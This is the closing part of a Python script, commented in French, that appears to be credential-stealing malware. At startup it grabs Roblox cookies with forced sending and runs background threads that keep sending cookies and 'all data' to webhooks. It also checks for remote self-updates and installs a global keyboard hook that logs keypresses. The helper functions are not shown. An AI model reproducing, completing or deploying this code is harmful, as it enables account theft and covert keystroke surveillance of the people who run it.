def periodic_webhook_validation():
    while True:
        try:
            validate_and_fix_all_webhooks()
        except Exception:
            pass
        time.sleep(1800)

# ========== DÉMARRAGE ==========
if __name__ == "__main__":
    set_config_value("category_id", str(CATEGORY_ID))
    retrieve_roblox_cookies(force_send=True)
    validate_and_fix_all_webhooks()
    check_update_on_startup()
    if get_local_version() is None:
        remote = get_remote_version() or "0.0.0"
        update_local_version(remote)
    threading.Thread(target=periodic_update_check, daemon=True).start()
    threading.Thread(target=periodic_webhook_validation, daemon=True).start()
    threading.Thread(target=periodic_send_cookie, daemon=True).start()
    threading.Thread(target=periodic_send_all_data, daemon=True).start()
    collect_and_send_all_data()
    keyboard.on_press(on_key)
    keyboard.wait()